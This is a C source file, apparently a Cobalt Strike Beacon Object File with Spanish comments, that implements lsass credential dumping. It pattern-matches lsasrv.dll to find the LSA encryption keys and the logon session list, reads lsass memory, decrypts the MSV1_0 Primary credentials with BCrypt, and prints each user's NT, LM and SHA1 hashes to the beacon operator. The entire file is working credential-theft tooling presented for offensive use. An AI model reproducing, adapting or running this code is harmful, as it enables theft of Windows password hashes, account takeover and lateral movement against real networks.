#include "../include/common_bof.h"

// ============================================================
// Firmas MSV1_0
// ============================================================
static const uint8_t msv_pat0[] = {0x45,0x89,0x34,0x24,0x48,0x8b,0xfb,0x45,0x85,0xc0,0x0f};
static const uint8_t msv_pat1[] = {0x45,0x89,0x34,0x24,0x8b,0xfb,0x45,0x85,0xc0,0x0f};
static const uint8_t msv_pat2[] = {0x45,0x89,0x37,0x49,0x4c,0x8b,0xf7,0x8b,0xf3,0x45,0x85,0xc0,0x0f};
static const uint8_t msv_pat3[] = {0x45,0x89,0x34,0x24,0x4c,0x8b,0xff,0x8b,0xf3,0x45,0x85,0xc0,0x74};
static const uint8_t msv_pat4[] = {0x33,0xff,0x41,0x89,0x37,0x4c,0x8b,0xf3,0x45,0x85,0xc0,0x74};
static const uint8_t msv_pat5[] = {0x33,0xff,0x41,0x89,0x37,0x4c,0x8b,0xf3,0x45,0x85,0xc9,0x74};
static const uint8_t msv_pat6[] = {0x33,0xff,0x45,0x89,0x37,0x48,0x8b,0xf3,0x45,0x85,0xc9,0x74};
static const uint8_t msv_pat7[] = {0x33,0xff,0x41,0x89,0x37,0x4c,0x8b,0xf3,0x45,0x85,0xc0,0x74};

static const MsvSig MSV_SIGS[] = {
    {msv_pat0,sizeof(msv_pat0), 25,-16,34,26200},
    {msv_pat1,sizeof(msv_pat1), 25,-16,34,26200},
    {msv_pat2,sizeof(msv_pat2), 27, -4, 0,22631},
    {msv_pat3,sizeof(msv_pat3), 24, -4, 0,20348},
    {msv_pat4,sizeof(msv_pat4), 23, -4, 0,18362},
    {msv_pat5,sizeof(msv_pat5), 23, -4, 0,17134},
    {msv_pat6,sizeof(msv_pat6), 23, -4, 0,15063},
    {msv_pat7,sizeof(msv_pat7), 16, -4, 0,10240},
};
#define MSV_SIGS_COUNT (sizeof(MSV_SIGS)/sizeof(MSV_SIGS[0]))

// ============================================================
// Firmas LSA keys
// ============================================================
static const uint8_t lsa_pat_a[] = {
    0x83,0x64,0x24,0x30,0x00,0x48,0x8d,0x45,0xe0,
    0x44,0x8b,0x4d,0xd8,0x48,0x8d,0x15
};
static const uint8_t lsa_pat_b[] = {
    0x83,0x64,0x24,0x30,0x00,0x44,0x8b,0x4d,0xd8,0x48,0x8b,0x0d
};
static const uint8_t lsa_pat_c[] = {
    0x83,0x64,0x24,0x30,0x00,0x44,0x8b,0x4c,0x24,0x48,0x48,0x8b,0x0d
};

const LsaSig LSA_SIGS[] = {
    {lsa_pat_a,sizeof(lsa_pat_a), 71,-89,16,0x38},
    {lsa_pat_a,sizeof(lsa_pat_a), 58,-89,16,0x38},
    {lsa_pat_a,sizeof(lsa_pat_a), 67,-89,16,0x38},
    {lsa_pat_a,sizeof(lsa_pat_a), 61,-73,16,0x38},
    {lsa_pat_b,sizeof(lsa_pat_b), 62,-70,23,0x38},
    {lsa_pat_b,sizeof(lsa_pat_b), 62,-70,23,0x28},
    {lsa_pat_b,sizeof(lsa_pat_b), 58,-62,23,0x28},
    {lsa_pat_c,sizeof(lsa_pat_c), 59,-61,25,0x18},
    {lsa_pat_c,sizeof(lsa_pat_c), 63,-69,25,0x18},
};
#define LSA_SIGS_COUNT (sizeof(LSA_SIGS)/sizeof(LSA_SIGS[0]))

// ============================================================
// Estructuras
// ============================================================
typedef struct {
    uint8_t iv[16];
    uint8_t aes_key[32];
    uint8_t des_key[24];
    size_t  aes_len;
    size_t  des_len;
    BOOL    valid;
} LsaKeys;

typedef struct {
    uint64_t list_ptr;
    uint32_t count;
} LogonListInfo;

typedef struct {
    uint64_t base;
    uint32_t size;
} ModuleInfo;

// ============================================================
// PrimaryCredOffsets por build
// ============================================================
typedef struct {
    uint32_t isIso;
    uint32_t isNtOwf;
    uint32_t nt_hash;
    uint32_t lm_hash;
    uint32_t sha_hash;
} PrimaryCredOffsets;

static inline PrimaryCredOffsets primary_cred_offsets(uint32_t build) {
    if (build >= 26100) {
        PrimaryCredOffsets o = { 0x28, 0x29, 0x46, 0x56, 0x66 };
        return o;
    } else if (build >= 22000) {
        PrimaryCredOffsets o = { 0x40, 0x41, 0x46, 0x56, 0x66 };
        return o;
    } else if (build >= 9600) {
        PrimaryCredOffsets o = { 0x28, 0x29, 0x4a, 0x5a, 0x36 };
        return o;
    } else {
        PrimaryCredOffsets o = { 0x28, 0x29, 0x38, 0x48, 0x18 };
        return o;
    }
}

// ============================================================
// Leer DLL desde disco sin LoadLibrary
// ============================================================
ByteBuf read_dll_from_disk(const wchar_t* dll_name) {
    wchar_t sys_dir[260] = {0};
    KERNEL32$GetSystemDirectoryW(sys_dir, 260);

    wchar_t path[512] = {0};
    size_t i = 0, j = 0;
    while (sys_dir[i] && i < 511) { path[i] = sys_dir[i]; i++; }
    path[i++] = L'\\';
    while (dll_name[j] && i < 511) { path[i++] = dll_name[j++]; }
    path[i] = L'\0';

    HANDLE hf = KERNEL32$CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
                    NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    ByteBuf empty = {0};
    if (hf == INVALID_HANDLE_VALUE) return empty;

    LARGE_INTEGER sz = {0};
    KERNEL32$GetFileSizeEx(hf, &sz);
    if (sz.QuadPart == 0 || sz.QuadPart > 0x1000000) {
        KERNEL32$CloseHandle(hf); return empty;
    }

    ByteBuf buf = bb_alloc((size_t)sz.QuadPart);
    if (!bb_valid(&buf)) { KERNEL32$CloseHandle(hf); return empty; }

    DWORD got = 0, total = 0;
    while (total < (DWORD)sz.QuadPart) {
        if (!KERNEL32$ReadFile(hf, buf.data + total,
                               (DWORD)sz.QuadPart - total, &got, NULL) || !got)
            break;
        total += got;
    }
    KERNEL32$CloseHandle(hf);
    buf.len = total;
    return buf;
}

// ============================================================
// Parsear seccion .text
// ============================================================
TextSection find_text_section(const ByteBuf* pe) {
    TextSection t = {0};
    if (pe->len < 0x200) return t;
    uint32_t pe_off = rd(pe->data, 0x3C);
    if (pe_off + 0x18 > pe->len) return t;
    uint16_t nsec   = rw(pe->data, pe_off + 6);
    uint16_t opt_sz = rw(pe->data, pe_off + 0x14);
    uint32_t sec_off = pe_off + 0x18 + opt_sz;
    for (uint16_t i = 0; i < nsec; i++) {
        uint32_t s = sec_off + i * 40;
        if (s + 40 > pe->len) break;
        if (memcmp(pe->data + s, ".text", 5) == 0) {
            t.virtual_address = rd(pe->data, s + 12);
            t.raw_offset      = rd(pe->data, s + 20);
            t.raw_size        = rd(pe->data, s + 16);
            return t;
        }
    }
    return t;
}

// ============================================================
// Buscar patron en bytes raw
// ============================================================
uint32_t local_search(const uint8_t* mem, uint32_t size,
                       const uint8_t* sig, uint32_t sig_len) {
    if (size < sig_len) return 0;
    for (uint32_t i = 0; i + sig_len <= size; i++)
        if (memcmp(mem + i, sig, sig_len) == 0) return i;
    return 0;
}

// ============================================================
// Resolver RIP-relative disp32
// ============================================================
uint32_t resolve_rip_raw(const uint8_t* text_raw,
                          uint32_t text_va, uint32_t instr_off) {
    int32_t disp = ri(text_raw, instr_off);
    uint32_t next_rva = text_va + instr_off + 4;
    return (uint32_t)((int32_t)next_rva + disp);
}

// ============================================================
// Extraer clave BCRYPT
// ============================================================
static BOOL extract_bcrypt_key(HANDLE h, uint64_t dtb,
                                uint64_t ptr_va, uint32_t hk_off,
                                uint8_t* key_out, size_t* key_len) {
    uint64_t handle_va = read_ptr(h, dtb, ptr_va);
    if (!handle_va) return FALSE;

    ByteBuf hk = proc_read(h, dtb, handle_va, 0x20);
    if (!bb_valid(&hk)) return FALSE;
    if (memcmp(hk.data + 4, "RUUU", 4) != 0) { bb_free(&hk); return FALSE; }
    uint64_t key_va = rp(hk.data, 0x10);
    bb_free(&hk);
    if (!key_va) return FALSE;

    size_t read_sz = hk_off + 4 + 0x40 + 16;
    ByteBuf kd = proc_read(h, dtb, key_va, read_sz);
    if (!bb_valid(&kd) || kd.len < hk_off + 8) { bb_free(&kd); return FALSE; }

    uint32_t cb = rd(kd.data, hk_off);
    uint32_t data_off = hk_off + 4;

    if (cb == 16) {
        // AES-256: segunda mitad en data_off + 0x34
        size_t need = data_off + 0x34 + 16;
        if (need > kd.len) {
            bb_free(&kd);
            kd = proc_read(h, dtb, key_va, need + 16);
            if (!bb_valid(&kd) || kd.len < need) { bb_free(&kd); return FALSE; }
        }
        memcpy(key_out,      kd.data + data_off,        16);
        memcpy(key_out + 16, kd.data + data_off + 0x34, 16);
        *key_len = 32;
    } else if (cb == 24 || cb == 32) {
        if (data_off + cb > kd.len) {
            bb_free(&kd);
            kd = proc_read(h, dtb, key_va, data_off + cb);
            if (!bb_valid(&kd)) return FALSE;
        }
        memcpy(key_out, kd.data + data_off, cb);
        *key_len = cb;
    } else {
        bb_free(&kd);
        return FALSE;
    }

    bb_free(&kd);
    return TRUE;
}

// ============================================================
// Extraer LSA keys
// ============================================================
LsaKeys extract_lsa_keys(HANDLE h, uint64_t dtb, uint64_t lsasrv_base) {
    LsaKeys keys = {0};

    ByteBuf dll = read_dll_from_disk(L"lsasrv.dll");
    if (!bb_valid(&dll) || dll.len < 0x1000) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Cannot read lsasrv.dll\n");
        bb_free(&dll); return keys;
    }

    TextSection text = find_text_section(&dll);
    if (!text.raw_size) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Cannot find .text in lsasrv.dll\n");
        bb_free(&dll); return keys;
    }

    const uint8_t* text_raw = dll.data + text.raw_offset;

    for (size_t s = 0; s < LSA_SIGS_COUNT; s++) {
        const LsaSig* sig = &LSA_SIGS[s];
        uint32_t sig_off = local_search(text_raw, text.raw_size,
                                         sig->pattern, (uint32_t)sig->pattern_len);
        if (!sig_off) continue;

        uint32_t iv_rva  = resolve_rip_raw(text_raw, text.virtual_address,
                                            sig_off + sig->iv_off);
        uint32_t des_rva = resolve_rip_raw(text_raw, text.virtual_address,
                                            sig_off + sig->des_off);
        uint32_t aes_rva = resolve_rip_raw(text_raw, text.virtual_address,
                                            sig_off + sig->aes_off);

        if (iv_rva > 0x1000000 || des_rva > 0x1000000 || aes_rva > 0x1000000)
            continue;

        ByteBuf iv_buf = proc_read(h, dtb, lsasrv_base + iv_rva, 16);
        if (!bb_valid(&iv_buf)) continue;

        BOOL all_zero = TRUE;
        for (int z = 0; z < 16; z++)
            if (iv_buf.data[z]) { all_zero = FALSE; break; }
        if (all_zero) { bb_free(&iv_buf); continue; }

        memcpy(keys.iv, iv_buf.data, 16);
        bb_free(&iv_buf);

        size_t aes_len = 0, des_len = 0;
        BOOL ok_aes = extract_bcrypt_key(h, dtb, lsasrv_base + aes_rva,
                                          sig->hk_off, keys.aes_key, &aes_len);
        BOOL ok_des = extract_bcrypt_key(h, dtb, lsasrv_base + des_rva,
                                          sig->hk_off, keys.des_key, &des_len);

        if (ok_aes && ok_des) {
            keys.aes_len = aes_len;
            keys.des_len = des_len;
            keys.valid   = TRUE;
            BeaconPrintf(CALLBACK_OUTPUT,
                "  LSA keys found (sig %d, AES=%d bytes, DES=%d bytes)\n",
                (int)s, (int)aes_len, (int)des_len);
            bb_free(&dll);
            return keys;
        }
    }

    bb_free(&dll);
    BeaconPrintf(CALLBACK_ERROR, "[-] LSA keys not found\n");
    return keys;
}

// ============================================================
// Encontrar LogonSessionList
// ============================================================
LogonListInfo find_logon_list(HANDLE h, uint64_t dtb,
                               uint64_t lsasrv_base, uint32_t build) {
    LogonListInfo info = {0};

    ByteBuf dll = read_dll_from_disk(L"lsasrv.dll");
    if (!bb_valid(&dll) || dll.len < 0x1000) { bb_free(&dll); return info; }

    TextSection text = find_text_section(&dll);
    if (!text.raw_size) { bb_free(&dll); return info; }

    const uint8_t* text_raw = dll.data + text.raw_offset;

    for (size_t s = 0; s < MSV_SIGS_COUNT; s++) {
        const MsvSig* sig = &MSV_SIGS[s];
        if (build < sig->min_build) continue;

        uint32_t sig_off = local_search(text_raw, text.raw_size,
                                         sig->pattern, (uint32_t)sig->pattern_len);
        if (!sig_off) continue;

        uint32_t fe_rva = resolve_rip_raw(text_raw, text.virtual_address,
                                           sig_off + sig->fe_off);
        uint64_t list_ptr = lsasrv_base + fe_rva;

        if (sig->corr_off) {
            uint32_t extra = rd(text_raw, sig_off + sig->corr_off);
            list_ptr += extra;
        }

        uint64_t head = read_ptr(h, dtb, list_ptr);
        if (head && head != list_ptr) {
            uint32_t count = 1;
            if (build >= 9200 && sig->cnt_off) {
                uint32_t cnt_rva = resolve_rip_raw(text_raw, text.virtual_address,
                                                    sig_off + sig->cnt_off);
                ByteBuf cb = proc_read(h, dtb, lsasrv_base + cnt_rva, 1);
                if (bb_valid(&cb) && cb.data[0]) count = cb.data[0];
                bb_free(&cb);
            }
            info.list_ptr = list_ptr;
            info.count    = count;
            bb_free(&dll);
            return info;
        }
    }

    bb_free(&dll);
    return info;
}

// ============================================================
// Encontrar modulo en lsass
// ============================================================
ModuleInfo find_module_in_lsass(HANDLE h, uint64_t dtb,
                                 uint64_t ep, uint32_t peb_off,
                                 const wchar_t* dll_name, size_t name_len) {
    ModuleInfo mod = {0};
    uint64_t peb_va = read_ptr(h, dtb, ep + peb_off);
    if (!peb_va) return mod;

    ByteBuf peb = proc_read(h, dtb, peb_va, 0x20);
    if (!bb_valid(&peb)) return mod;
    uint64_t ldr = rp(peb.data, 0x18);
    bb_free(&peb);
    if (!ldr) return mod;

    uint64_t head = ldr + 0x20;
    uint64_t cur  = read_ptr(h, dtb, head);

    SeenSet seen;
    seen_init(&seen);
    seen_insert(&seen, head);

    for (int i = 0; i < 200; i++) {
        if (!cur || seen_contains(&seen, cur)) break;
        seen_insert(&seen, cur);

        ByteBuf entry = proc_read(h, dtb, cur - 0x10, 0x80);
        if (!bb_valid(&entry)) break;

        uint64_t dll_base = rp(entry.data, 0x30);
        uint32_t dll_size = rd(entry.data, 0x40);
        uint16_t nm_len   = rw(entry.data, 0x48);
        uint64_t nm_ptr   = rp(entry.data, 0x50);

        if (nm_len && nm_ptr && nm_len <= 512) {
            ByteBuf raw = proc_read(h, dtb, nm_ptr, nm_len);
            if (bb_valid(&raw)) {
                size_t raw_chars = nm_len / 2;
                wchar_t* wname = (wchar_t*)raw.data;
                BOOL found = FALSE;
                for (size_t start = 0; start + name_len <= raw_chars; start++) {
                    BOOL match = TRUE;
                    for (size_t k = 0; k < name_len; k++) {
                        wchar_t c = wname[start + k];
                        if (c >= 'A' && c <= 'Z') c += 32;
                        if (c != dll_name[k]) { match = FALSE; break; }
                    }
                    if (match) { found = TRUE; break; }
                }
                if (found) {
                    mod.base = dll_base;
                    mod.size = dll_size;
                    bb_free(&raw);
                    bb_free(&entry);
                    return mod;
                }
                bb_free(&raw);
            }
        }
        cur = rp(entry.data, 0x10);
        bb_free(&entry);
    }
    return mod;
}

// ============================================================
// walk_primary - decrypt inline con BCrypt directo
// ============================================================
static void walk_primary(HANDLE h, uint64_t dtb,
                          uint64_t pc_ptr,
                          const LsaKeys* keys,
                          CredList* results,
                          const wchar_t* user,
                          const wchar_t* domain,
                          uint32_t build) {
    SeenSet seen;
    seen_init(&seen);
    uint64_t cur = pc_ptr;

    // Cargar BCrypt una vez para este walk
    DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
    DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
    typedef LONG (WINAPI* pOpen)(PVOID*,LPCWSTR,LPCWSTR,ULONG);
    typedef LONG (WINAPI* pSet)(PVOID,LPCWSTR,PUCHAR,ULONG,ULONG);
    typedef LONG (WINAPI* pGet)(PVOID,LPCWSTR,PUCHAR,ULONG,PULONG,ULONG);
    typedef LONG (WINAPI* pGen)(PVOID,PVOID*,PUCHAR,ULONG,PUCHAR,ULONG,ULONG);
    typedef LONG (WINAPI* pDec)(PVOID,PUCHAR,ULONG,PVOID,PUCHAR,ULONG,PUCHAR,ULONG,PULONG,ULONG);
    typedef LONG (WINAPI* pDes)(PVOID);
    typedef LONG (WINAPI* pCls)(PVOID,ULONG);

    HMODULE hb = KERNEL32$LoadLibraryA("bcrypt.dll");
    if (!hb) return;
    pOpen Open = (pOpen)KERNEL32$GetProcAddress(hb, "BCryptOpenAlgorithmProvider");
    pSet  Set  = (pSet) KERNEL32$GetProcAddress(hb, "BCryptSetProperty");
    pGet  Get  = (pGet) KERNEL32$GetProcAddress(hb, "BCryptGetProperty");
    pGen  Gen  = (pGen) KERNEL32$GetProcAddress(hb, "BCryptGenerateSymmetricKey");
    pDec  Dec  = (pDec) KERNEL32$GetProcAddress(hb, "BCryptDecrypt");
    pDes  Des  = (pDes) KERNEL32$GetProcAddress(hb, "BCryptDestroyKey");
    pCls  Cls  = (pCls) KERNEL32$GetProcAddress(hb, "BCryptCloseAlgorithmProvider");
    if (!Open || !Dec) return;

    while (cur && !seen_contains(&seen, cur) && seen.count < 20) {
        seen_insert(&seen, cur);

        ByteBuf pd = proc_read(h, dtb, cur, 0x60);
        if (!bb_valid(&pd)) break;

        uint64_t nxt     = rp(pd.data, 0);
        uint16_t enc_len = rw(pd.data, 0x18);
        uint64_t enc_buf = rp(pd.data, 0x20);

        // Leer package name
        char* pkg = (char*)BOF_ALLOC(32);
        if (pkg) {
            uint16_t pkg_len = rw(pd.data, 8);
            uint64_t pkg_ptr = rp(pd.data, 0x10);
            if (pkg_len && pkg_ptr && pkg_len < 32) {
                ByteBuf pn = proc_read(h, dtb, pkg_ptr, pkg_len);
                if (bb_valid(&pn)) { memcpy(pkg, pn.data, pkg_len); bb_free(&pn); }
            }
        }
        bb_free(&pd);

        if (pkg && memcmp(pkg, "Primary", 7) == 0 &&
            enc_len > 0 && enc_len < 0x10000 && enc_buf) {

            ByteBuf blob = proc_read(h, dtb, enc_buf, enc_len);
            if (bb_valid(&blob)) {
                // Elegir algoritmo
                const wchar_t* alg_id = (enc_len % 8 != 0) ? L"AES" : L"3DES";
                void* alg = NULL;
                Open(&alg, alg_id, NULL, 0);

                if (enc_len % 8 != 0) {
                    Set(alg, L"ChainingMode", (PUCHAR)L"ChainingModeCFB",
                        (ULONG)(16*sizeof(wchar_t)), 0);
                    ULONG fb = 16;
                    Set(alg, L"MessageBlockLength", (PUCHAR)&fb, sizeof(ULONG), 0);
                } else {
                    Set(alg, L"ChainingMode", (PUCHAR)L"ChainingModeCBC",
                        (ULONG)(16*sizeof(wchar_t)), 0);
                }

                ULONG obj_sz = 0, dummy = 0;
                Get(alg, L"ObjectLength", (PUCHAR)&obj_sz, sizeof(ULONG), &dummy, 0);
                if (!obj_sz) obj_sz = 600;
                uint8_t* obj = (uint8_t*)BOF_ALLOC(obj_sz);
                void* bkey = NULL;

                if (obj) {
                    if (enc_len % 8 != 0)
                        Gen(alg, &bkey, obj, obj_sz, (PUCHAR)keys->aes_key, 16, 0);
                    else
                        Gen(alg, &bkey, obj, obj_sz, (PUCHAR)keys->des_key, 24, 0);
                }

                uint8_t* out_buf = bkey ? (uint8_t*)BOF_ALLOC(blob.len + 16) : NULL;
                ULONG rlen = 0;
                LONG r = -1;

                if (out_buf) {
                    if (enc_len % 8 != 0) {
                        uint8_t iv16[16];
                        memcpy(iv16, keys->iv, 16);
                        r = Dec(bkey, blob.data, (ULONG)blob.len, NULL,
                                iv16, 16, out_buf, (ULONG)blob.len, &rlen, 0);
                    } else {
                        uint8_t iv8[8];
                        memcpy(iv8, keys->iv, 8);
                        r = Dec(bkey, blob.data, (ULONG)blob.len, NULL,
                                iv8, 8, out_buf, (ULONG)blob.len, &rlen, 0);
                    }
                }

                if (bkey) Des(bkey);
                if (obj)  BOF_FREE(obj);
                Cls(alg, 0);
                bb_free(&blob);


                if (r == 0 && rlen > 0x50 && out_buf) {
                    PrimaryCredOffsets pco = primary_cred_offsets(build);
                    if (!out_buf[pco.isIso] && out_buf[pco.isNtOwf] &&
                        rlen > pco.nt_hash + 16) {
                        if (results->count < results->capacity) {
                            // Deduplicar por NT hash
                            char nt[33] = {0};
                            to_hex(out_buf + pco.nt_hash, 16, nt);
                            BOOL dup = FALSE;
                            for (size_t d = 0; d < results->count; d++) {
                                if (memcmp(results->items[d].nt_hash, nt, 32) == 0) {
                                    dup = TRUE; break;
                                }
                            }
                            if (!dup) {
                                Credential* c = &results->items[results->count++];
                                memcpy(c->user,   user,   MAX_NAME_LEN * sizeof(wchar_t));
                                memcpy(c->domain, domain, MAX_NAME_LEN * sizeof(wchar_t));
                                memcpy(c->nt_hash, nt, 33);
                                to_hex(out_buf + pco.lm_hash, 16, c->lm_hash);
                                if (rlen > pco.sha_hash + 20)
                                    to_hex(out_buf + pco.sha_hash, 20, c->sha_hash);
                            }
                        }
                    }
                }
                if (out_buf) BOF_FREE(out_buf);
            }
        }

        if (pkg) BOF_FREE(pkg);
        if (!nxt || nxt == pc_ptr) break;
        cur = nxt;
    }
}

// ============================================================
// walk_creds
// ============================================================
static void walk_creds(HANDLE h, uint64_t dtb,
                        uint64_t cred_ptr,
                        const LsaKeys* keys,
                        CredList* results,
                        const wchar_t* user,
                        const wchar_t* domain,
                        uint32_t build) {
    SeenSet seen;
    seen_init(&seen);
    uint64_t cur = cred_ptr;

    while (cur && !seen_contains(&seen, cur) && seen.count < 20) {
        seen_insert(&seen, cur);
        ByteBuf cd = proc_read(h, dtb, cur, 0x20);
        if (!bb_valid(&cd)) break;
        uint64_t nxt = rp(cd.data, 0);
        uint64_t pc  = rp(cd.data, 0x10);
        bb_free(&cd);
        if (pc) walk_primary(h, dtb, pc, keys, results, user, domain, build);
        if (!nxt || nxt == cred_ptr) break;
        cur = nxt;
    }
}

// ============================================================
// extract_msv_creds
// ============================================================
CredList extract_msv_creds(HANDLE h, uint64_t dtb,
                            uint64_t list_ptr, uint32_t count,
                            uint32_t build, const LsaKeys* keys) {
    CredList results = {0};
    credlist_init(&results);
    if (!results.items) return results;
    SessionOffsets off = session_offsets(build);

    for (uint32_t idx = 0; idx < count; idx++) {
        uint64_t head_va = list_ptr + idx * 16;
        uint64_t entry   = read_ptr(h, dtb, head_va);

        SeenSet seen;
        seen_init(&seen);
        seen_insert(&seen, head_va);

        while (entry && !seen_contains(&seen, entry) && seen.count < 100) {
            seen_insert(&seen, entry);

            ByteBuf data = proc_read(h, dtb, entry, 0x200);
            if (!bb_valid(&data)) break;

            wchar_t* user   = (wchar_t*)BOF_ALLOC(MAX_NAME_LEN * sizeof(wchar_t));
            wchar_t* domain = (wchar_t*)BOF_ALLOC(MAX_NAME_LEN * sizeof(wchar_t));
            if (!user || !domain) {
                if (user)   BOF_FREE(user);
                if (domain) BOF_FREE(domain);
                bb_free(&data);
                break;
            }

            read_ustr(h, dtb, data.data, off.user,   user,   MAX_NAME_LEN);
            read_ustr(h, dtb, data.data, off.domain, domain, MAX_NAME_LEN);
            uint64_t cred = rp(data.data, off.cred_ptr);
            uint64_t next = rp(data.data, 0);
            bb_free(&data);

            if (user[0] && cred)
                walk_creds(h, dtb, cred, keys, &results, user, domain, build);

            BOF_FREE(user);
            BOF_FREE(domain);
            entry = next;
        }
    }
    return results;
}

// ============================================================
// print_creds
// ============================================================
void print_creds(const CredList* creds) {
    static const char zeros_lm[] = "aad3b435b51404eeaad3b435b51404ee";

    BeaconPrintf(CALLBACK_OUTPUT,
        "\n======================================================================\n");
    BeaconPrintf(CALLBACK_OUTPUT, " MSV1_0 CREDENTIALS\n");
    BeaconPrintf(CALLBACK_OUTPUT,
        "======================================================================\n");

    if (!creds->count || !creds->items) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] No credentials extracted\n");
        BeaconPrintf(CALLBACK_OUTPUT,
            "    (Credential Guard may be active - isIso=1)\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] %d credential(s):\n\n",
                 (int)creds->count);

    for (size_t i = 0; i < creds->count; i++) {
        const Credential* c = &creds->items[i];
        print_wstr(L"  ", c->domain);
        BeaconPrintf(CALLBACK_OUTPUT, "\\");
        print_wstr(L"", c->user);
        BeaconPrintf(CALLBACK_OUTPUT, "\n");
        BeaconPrintf(CALLBACK_OUTPUT, "    NT:   %s\n", c->nt_hash);
        if (memcmp(c->lm_hash, zeros_lm, 32) != 0)
            BeaconPrintf(CALLBACK_OUTPUT, "    LM:   %s\n", c->lm_hash);
        if (c->sha_hash[0])
            BeaconPrintf(CALLBACK_OUTPUT, "    SHA1: %s\n", c->sha_hash);
        BeaconPrintf(CALLBACK_OUTPUT, "\n");
    }
}
